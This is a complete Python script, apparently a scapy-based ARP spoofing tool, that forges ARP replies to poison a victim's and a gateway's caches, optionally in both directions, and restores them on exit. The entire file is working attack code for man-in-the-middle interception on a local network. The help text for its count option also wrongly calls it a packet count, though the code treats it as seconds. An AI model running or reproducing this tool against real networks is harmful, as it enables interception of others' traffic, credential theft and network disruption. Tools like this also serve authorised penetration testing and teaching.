#!/usr/bin/env python3
"""
arp_spoofing.py
Simple ARP spoofing/poisoning tool using scapy.

Features:
- Poison victim <-> gateway ARP cache (one- or two-way / bidirectional)
- Auto-resolve MAC addresses if not provided
- Periodic sending with configurable interval
- Optional limited count (0 = infinite)
- Restore original ARP entries on exit (SIGINT / SIGTERM)

MODIFICA: ora accetta anche un argomento posizionale opzionale (victim IP)
         che può essere passato senza scrivere --victim.
"""

import argparse
import time
import signal
import sys
from scapy.all import ARP, Ether, sendp, srp, conf, get_if_hwaddr

conf.verb = 0

def get_mac(ip, iface, timeout=2, retry=2):
    """
    Resolve MAC for an IP using ARP request broadcast.
    Returns MAC string or None.
    """
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=timeout, retry=retry, iface=iface, verbose=0)
    for _, r in ans:
        if r and r.haslayer(Ether):
            return r[Ether].src
        if r and r.haslayer(ARP):
            return r[ARP].hwsrc
    return None

def craft_arp(src_ip, src_mac, target_ip, target_mac):
    """
    Build an Ethernet/ARP reply that tells `target_ip` that `src_ip` is at `src_mac`.
    Equivalent to: ARP(op=2, psrc=src_ip, hwsrc=src_mac, pdst=target_ip, hwdst=target_mac)
    Wrapped in Ether(dst=target_mac).
    """
    arp = ARP(op=2, psrc=src_ip, hwsrc=src_mac, pdst=target_ip, hwdst=target_mac)
    ether = Ether(dst=target_mac, src=src_mac)
    return ether / arp

def restore_arp(real_src_ip, real_src_mac, target_ip, target_mac, iface):
    """
    Send correct (restorative) ARP replies to restore ARP table.
    """
    pkt = craft_arp(real_src_ip, real_src_mac, target_ip, target_mac)
    sendp(pkt, iface=iface, count=5, inter=0.2, verbose=0)

running = True
def sigint_handler(sig, frame):
    global running
    running = False
    print("\n[!] Caught signal, stopping and restoring ARP (if enabled)...")

def main():
    global running
    parser = argparse.ArgumentParser(description="ARP spoofing/poisoning helper (scapy)")
    # POSIZIONALE OPZIONALE: victim IP shorthand
    parser.add_argument("victim_pos", nargs="?", help="(positional) victim IP — shorthand alternative to --victim")
    parser.add_argument("--iface", "-i", required=True, help="interface to use (e.g. eth0)")
    parser.add_argument("--victim", "-v", help="victim IP (or use positional victim IP)")
    parser.add_argument("--gateway", "-g", required=True, help="gateway IP (or other target to poison)")
    parser.add_argument("--victim-mac", help="victim MAC (if omitted script will resolve it)")
    parser.add_argument("--gateway-mac", help="gateway MAC (if omitted script will resolve it)")
    parser.add_argument("--interval", "-I", type=float, default=2.0, help="seconds between poison packets (default: 2.0)")
    parser.add_argument("--count", "-c", type=int, default=5, help="number of poison packets to send (0 = infinite)")
    parser.add_argument("--bidirectional", "-r", action="store_true", help="poison both victim -> gateway and gateway -> victim")
    parser.add_argument("--restore", action="store_true", default=True, help="restore ARP on exit (default: True)")
    parser.add_argument("--no-restore", dest="restore", action="store_false", help="do NOT restore ARP on exit")
    args = parser.parse_args()

    iface = args.iface
    # usa --victim se presente, altrimenti usa il posizionale
    victim_ip = args.victim or args.victim_pos
    gateway_ip = args.gateway
    interval = float(args.interval)
    count = int(args.count)
    bidir = bool(args.bidirectional)
    do_restore = bool(args.restore)

    if not victim_ip:
        print("[!] No victim provided. Use --victim <IP> or provide <victim_ip> as positional argument.")
        parser.print_usage()
        sys.exit(1)

    # local MAC (attacker MAC) on iface
    try:
        attacker_mac = get_if_hwaddr(iface)
    except Exception as e:
        print(f"[!] Cannot get local MAC for interface {iface}: {e}")
        sys.exit(1)

    # Resolve victim/gateway MACs if not provided
    victim_mac = args.victim_mac or get_mac(victim_ip, iface)
    if not victim_mac:
        print(f"[!] Could not resolve victim MAC for {victim_ip} on {iface}")
        sys.exit(1)

    gateway_mac = args.gateway_mac or get_mac(gateway_ip, iface)
    if not gateway_mac:
        print(f"[!] Could not resolve gateway MAC for {gateway_ip} on {iface}")
        sys.exit(1)

    print(f"[+] Interface: {iface}  Attacker MAC: {attacker_mac}")
    print(f"[+] Victim: {victim_ip} ({victim_mac})")
    print(f"[+] Gateway: {gateway_ip} ({gateway_mac})")
    print(f"[+] Bidirectional: {bidir}  Interval: {interval}s  Duration: {count or 'infinite'}s  Restore-on-exit: {do_restore}")

    # Build poison packets:
    # tell victim that gateway_ip is at attacker_mac
    pkt_victim = craft_arp(gateway_ip, attacker_mac, victim_ip, victim_mac)
    # tell gateway that victim_ip is at attacker_mac
    pkt_gateway = craft_arp(victim_ip, attacker_mac, gateway_ip, gateway_mac)

    # register signal handlers
    signal.signal(signal.SIGINT, sigint_handler)
    signal.signal(signal.SIGTERM, sigint_handler)

    sent = 0
    start_time = time.time()
    end_time = start_time + count if count > 0 else None
    try:
        while running and (count == 0 or time.time() < end_time):
            # send to victim
            sendp(pkt_victim, iface=iface, verbose=0)
            # optionally send to gateway (to poison reverse direction)
            if bidir:
                sendp(pkt_gateway, iface=iface, verbose=0)
            sent += 1
            # very small pause if interval is very small
            time.sleep(interval)
    except KeyboardInterrupt:
        running = False

    # restore
    if do_restore:
        print("[*] Restoring ARP tables...")
        # restore correct mapping (send multiple times to ensure)
        try:
            restore_arp(gateway_ip, gateway_mac, victim_ip, victim_mac, iface)
            if bidir:
                restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        except Exception as e:
            print(f"[!] Error while restoring: {e}")

    print(f"[*] Done. Sent poison packets: {sent} (ran for {round(time.time()-start_time,2)}s)")

if __name__ == "__main__":
    main()